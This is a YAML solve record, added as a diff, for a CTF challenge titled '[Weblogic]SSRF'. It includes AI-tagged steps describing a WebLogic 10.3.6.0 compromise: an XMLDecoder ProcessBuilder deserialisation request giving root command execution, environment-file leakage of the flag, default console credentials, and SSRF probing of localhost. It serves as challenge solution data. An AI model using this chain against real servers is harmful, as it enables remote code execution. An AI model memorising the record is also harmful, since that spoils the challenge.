@@ -1,0 +1,41 @@
+name: '[Weblogic]SSRF'
+category: web
+keywords:
+- weblogic
+- ssrf
+- github
+- vulhub
+- tree
+- master
+steps:
+- '[claude] WebLogic 10.3.6.0; `POST /wls-wsat/CoordinatorPortType` with XMLDecoder
+  `<object class="java.lang.ProcessBuilder">` + `<string>` args executes commands
+  as root (NOT `<void>` — that gives ArrayIndexOut'
+- '[claude] `GET /bea_wls_internal/env.txt` returns the container env including `FLAG=<FLAG>`;
+  `/bea_wls_internal/id.txt` gives `uid=0(root)`.'
+- '[claude] weak console creds `weblogic:Oracle@123` valid (`ADMINCONSOLESESSION`,
+  Console Home).'
+- '[claude] SSRF self-proof: `operator=http://127.0.0.1:7001` → "returned a 404 error
+  code"; all tested non-HTTP localhost ports CLOSED (no Redis on this instance).'
+- '[claude] FOUND_FLAG=<FLAG>'
+- WebLogic 10.3.6.0 at http://direct-ctf2.dasctf.com:26653 (version leaked on /console/login/LoginForm.jsp),
+  X-Powered-By Servlet/2.5 JSP/2.1
+- 'Deployed: /uddiexplorer/ + SearchPublicRegistries.jsp serve real form (8832/10300
+  B). /wls-wsat/{CoordinatorPortType,ParticipantPortType,CoordinatorPortType11,RegistrationRequesterPortType11,RegistrationPortTypeRPC}
+  200. /_async/AsyncResponseService 200. /bea_wls_internal/classes/.../*.class static
+  class files 200'
+- 'Absent(404): /bea_wls_debug_rsrc/*, /ws_utc/*, /management/*, /bea_wls_internal/1.jsp.
+  /console/ redirects 302->login'
+evidence_chain:
+- '[claude] FOUND_FLAG=<FLAG>'
+- WebLogic 10.3.6.0 at http://direct-ctf2.dasctf.com:26653 (version leaked on /console/login/LoginForm.jsp),
+  X-Powered-By Servlet/2.5 JSP/2.1
+- 'Deployed: /uddiexplorer/ + SearchPublicRegistries.jsp serve real form (8832/10300
+  B). /wls-wsat/{CoordinatorPortType,ParticipantPortType,CoordinatorPortType11,RegistrationRequesterPortType11,RegistrationPortTypeRPC}
+  200. /_async/AsyncResponseService 200. /bea_wls_internal/classes/.../*.class static
+  class files 200'
+- 'Absent(404): /bea_wls_debug_rsrc/*, /ws_utc/*, /management/*, /bea_wls_internal/1.jsp.
+  /console/ redirects 302->login'
+success_format: CTF2\{[^}]+\}
+source: af00b8fa-f7dd-411b-95c1-8c682d559c4b (solver 56143086-ad73-451f-9ff9-ab29e60d9d2d)
+notes: ''
